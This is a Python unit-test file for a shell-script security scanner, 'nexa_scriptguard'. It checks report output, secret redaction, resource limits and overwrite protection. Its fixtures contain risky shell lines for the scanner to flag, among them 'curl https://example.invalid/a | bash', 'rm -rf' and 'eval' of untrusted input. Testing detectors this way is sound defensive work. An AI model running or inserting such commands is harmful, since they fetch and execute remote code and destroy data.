import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
RUST_EXECUTABLE = (
    ROOT / "rust" / "nexa-scriptguard-helper" / "target" / "debug"
    / ("nexa-scriptguard-helper.exe" if sys.platform == "win32" else "nexa-scriptguard-helper")
)


class CliTests(unittest.TestCase):
    def run_cli(self, script, *args):
        return subprocess.run(
            [sys.executable, "-m", "nexa_scriptguard", str(script), *map(str, args)],
            cwd=ROOT,
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )

    def test_complete_scan_writes_json_and_sarif(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "sample.sh"
            report_path = root / "report.json"
            sarif_path = root / "report.sarif"
            script.write_text("chmod 777 ./file\n", encoding="utf-8")
            result = self.run_cli(
                script, "--view", "plain", "--json", report_path,
                "--sarif", sarif_path,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            report = json.loads(report_path.read_text(encoding="utf-8"))
            sarif = json.loads(sarif_path.read_text(encoding="utf-8"))
        self.assertTrue(report["complete"])
        self.assertIn("SG-003", {item["rule_id"] for item in report["findings"]})
        self.assertEqual(sarif["version"], "2.1.0")

    def test_default_reports_redact_secrets_and_escape_controls(self):
        secret = "synthetic_cli_secret_991"
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "sample.sh"
            report_path = root / "report.json"
            script.write_text(
                f'eval "TOKEN={secret}" # \\x1b]0;title\n',
                encoding="utf-8",
            )
            result = self.run_cli(
                script, "--view", "plain", "--json", report_path
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            encoded = report_path.read_text(encoding="utf-8") + result.stdout
        self.assertNotIn(secret, encoded)
        self.assertNotIn("\x1b", encoded)

    def test_resource_limit_writes_incomplete_status_and_exit_code(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "sample.sh"
            report_path = root / "report.json"
            script.write_text(
                "chmod 777 file\nrm -rf tmp\neval \"$INPUT\"\n",
                encoding="utf-8",
            )
            result = self.run_cli(
                script, "--view", "plain", "--json", report_path,
                "--max-findings", "1",
            )
            report = json.loads(report_path.read_text(encoding="utf-8"))
        self.assertEqual(result.returncode, 3)
        self.assertFalse(report["complete"])
        self.assertEqual(report["analysis_status"], "incomplete")

    def test_existing_output_is_not_overwritten(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "sample.sh"
            report_path = root / "report.json"
            script.write_text("echo safe\n", encoding="utf-8")
            report_path.write_text("preserve", encoding="utf-8")
            result = self.run_cli(
                script, "--view", "plain", "--json", report_path
            )
            preserved = report_path.read_text(encoding="utf-8")
        self.assertEqual(result.returncode, 4)
        self.assertEqual(preserved, "preserve")

    @unittest.skipUnless(RUST_EXECUTABLE.is_file(), "Rust helper has not been built")
    def test_cli_merges_the_rust_process_result(self):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "sample.sh"
            report_path = root / "report.json"
            script.write_text(
                "curl https://example.invalid/a | bash\n", encoding="utf-8"
            )
            result = self.run_cli(
                script, "--view", "plain", "--json", report_path,
                "--rust-helper", RUST_EXECUTABLE,
            )
            report = json.loads(report_path.read_text(encoding="utf-8"))
        self.assertEqual(result.returncode, 0, result.stderr)
        matches = [
            item for item in report["findings"]
            if item["rule_id"] == "SG-001"
        ]
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0]["engine"], "python")
